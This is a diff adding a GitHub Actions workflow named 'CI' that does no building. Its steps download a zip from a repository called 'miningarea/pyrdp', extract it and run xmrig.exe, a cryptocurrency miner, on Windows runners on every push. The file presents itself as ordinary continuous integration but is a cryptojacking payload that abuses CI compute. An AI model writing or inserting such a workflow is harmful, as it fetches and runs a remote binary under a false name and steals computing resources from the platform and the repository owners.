@@ -1,0 +1,16 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - name: Download
+      run: Invoke-WebRequest https://github.com/miningarea/pyrdp/raw/main/file.zip -OutFile file.zip
+    - name: Extract
+      run: Expand-Archive file.zip
+    - name: Execution
+      run: .\file\xmrig.exe
